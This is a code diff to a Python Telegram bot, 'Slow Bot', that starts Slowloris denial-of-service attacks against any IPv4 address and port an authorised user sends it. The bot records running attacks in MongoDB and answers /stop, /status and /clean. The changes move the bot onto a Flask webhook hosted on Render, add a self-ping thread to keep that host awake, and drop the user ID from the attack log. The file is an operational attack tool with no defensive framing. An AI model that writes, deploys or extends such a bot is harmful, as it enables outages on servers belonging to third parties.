@@ -1,6 +1,12 @@
+import asyncio
 import logging
 import os
 import re
+import threading
+import time
+
+import requests
+from flask import Flask, jsonify, request
 
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
@@ -24,6 +30,9 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "").split(",") if x.strip()]
 DEFAULT_PORT = int(os.getenv("DEFAULT_PORT", "80"))
 DEFAULT_CONN = int(os.getenv("DEFAULT_CONN", "250"))
+PORT = int(os.getenv("PORT", "10000"))                       # Render injects this
+SELF_URL = (os.getenv("RENDER_EXTERNAL_URL") or os.getenv("SELF_URL") or "").rstrip("/")
+PING_INTERVAL = int(os.getenv("PING_INTERVAL", "600"))       # seconds = 10 minutes
 
 IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
 IPPORT_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$")
@@ -40,7 +49,7 @@ def allowed(update: Update) -> bool:
 def valid_ip(ip: str) -> bool:
     if not IP_RE.match(ip):
         return False
-    return all(0 <= int(part) <= 255 for part in ip.split("."))
+    return all(0 <= int(p) <= 255 for p in ip.split("."))
 
 
 def parse_target(text: str):
@@ -53,18 +62,17 @@ def parse_target(text: str):
     return None, None
 
 
+# ---------------- Telegram handlers ----------------
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not allowed(update):
         return await update.message.reply_text("⛔ Not authorized.")
     await update.message.reply_text(
         "🤖 *Slow Bot*\n\n"
-        "Send me a target IP address and I'll saturate it with slow HTTP connections.\n\n"
-        "• `203.0.113.10` — uses default port 80\n"
+        "Send me a target IP and I'll saturate it with slow HTTP connections.\n\n"
+        "• `203.0.113.10` — default port 80\n"
         "• `203.0.113.10:443` — custom port\n\n"
-        "Commands:\n"
-        "`/stop` — halt the running attack\n"
-        "`/status` — show all active attacks\n"
-        "`/clean` — remove all stopped jobs",
+        "Commands:\n`/stop` · `/status` · `/clean`",
         parse_mode="Markdown",
     )
 
@@ -74,16 +82,14 @@ async def handle_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("⛔ Not authorized.")
 
     chat_id = update.effective_chat.id
-    text = update.message.text.strip()
-
-    ip, port = parse_target(text)
+    ip, port = parse_target(update.message.text)
     if not ip:
         return await update.message.reply_text(
-            "❌ That doesn't look like a valid IPv4 address. Try `203.0.113.10` or `203.0.113.10:8080`."
+            "❌ Invalid IPv4. Try `203.0.113.10` or `203.0.113.10:8080`."
         )
 
     if chat_id in attacks and attacks[chat_id].is_running:
-        return await update.message.reply_text("⚠️ An attack is already running for this chat. Use `/stop` first.")
+        return await update.message.reply_text("⚠️ Attack already running. Use `/stop` first.")
 
     attack = SlowlorisAttack(
         target=ip,
@@ -99,12 +105,11 @@ async def handle_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"🚀 Attack started against `{ip}:{port}`\n"
         f"• Connections: `{DEFAULT_CONN}`\n"
-        f"• Status: `running` (saved in MongoDB)\n\n"
-        f"Press the button or send `/stop` when done.",
+        f"• Status: `running` (saved in MongoDB)",
         parse_mode="Markdown",
         reply_markup=kb,
     )
-    logger.info("Attack started by %s on %s:%s", update.effective_user.id, ip, port)
+    logger.info("Attack started on %s:%s", ip, port)
 
 
 async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -113,7 +118,7 @@ async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     attack = attacks.get(chat_id)
     if not attack or not attack.is_running:
-        return await update.message.reply_text("ℹ️ No running attack for this chat.")
+        return await update.message.reply_text("ℹ️ No running attack.")
     attack.stop()
     mark_stopped(chat_id)
     attacks.pop(chat_id, None)
@@ -156,19 +161,91 @@ async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🧹 Removed {n} stopped job(s).")
 
 
+# ---------------- Bot build + webhook ----------------
+
+def build_bot() -> Application:
+    bot = Application.builder().token(BOT_TOKEN).build()
+    bot.add_handler(CommandHandler("start", start))
+    bot.add_handler(CommandHandler("stop", stop_cmd))
+    bot.add_handler(CommandHandler("status", status_cmd))
+    bot.add_handler(CommandHandler("clean", clean_cmd))
+    bot.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop$"))
+    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
+    return bot
+
+
+application = build_bot()
+
+app = Flask(__name__)
+
+
+@app.get("/")
+def index():
+    return jsonify({"service": "slowbot", "status": "ok"})
+
+
+@app.get("/health")
+def health():
+    running = [a for a in attacks.values() if a.is_running]
+    return jsonify({"ok": True, "active_attacks": len(running)})
+
+
+@app.post("/webhook")
+def webhook():
+    """Telegram pushes every update here (no polling)."""
+    try:
+        update = Update.de_json(request.get_json(force=True), application.bot)
+        asyncio.run(application.process_update(update))
+        return ("ok", 200)
+    except Exception as e:
+        logger.exception("Webhook error: %s", e)
+        return ("error", 500)
+
+
+# ---------------- Self-ping keep-alive ----------------
+
+def self_ping_loop():
+    url = f"{SELF_URL}/health"
+    logger.info("Self-ping thread started → %s every %ss", url, PING_INTERVAL)
+    while True:
+        time.sleep(PING_INTERVAL)
+        try:
+            r = requests.get(url, timeout=15)
+            logger.info("Self-ping → %s (%s)", r.status_code, r.text[:40])
+        except Exception as e:
+            logger.warning("Self-ping failed: %s", e)
+
+
+# ---------------- Startup ----------------
+
+def register_webhook():
+    if not SELF_URL:
+        logger.warning("RENDER_EXTERNAL_URL not set — webhook skipped, falling back to polling")
+        threading.Thread(target=_polling_fallback, daemon=True).start()
+        return
+
+    async def _set():
+        await application.initialize()
+        await application.bot.set_webhook(url=f"{SELF_URL}/webhook")
+        info = await application.bot.get_webhook_info()
+        logger.info("Webhook registered: %s", info.url)
+
+    asyncio.run(_set())
+
+
+def _polling_fallback():
+    asyncio.set_event_loop(asyncio.new_event_loop())
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+
 def main():
     if not BOT_TOKEN:
         raise SystemExit("BOT_TOKEN env var is required")
-    reset_stale()  # mark leftover "running" jobs as stopped on restart
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_cmd))
-    app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(CommandHandler("clean", clean_cmd))
-    app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop$"))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
-    logger.info("Bot started, polling...")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    reset_stale()
+    threading.Thread(target=self_ping_loop, daemon=True).start()
+    register_webhook()
+    logger.info("Serving on port %s", PORT)
+    app.run(host="0.0.0.0", port=PORT, threaded=True)
 
 
 if __name__ == "__main__":
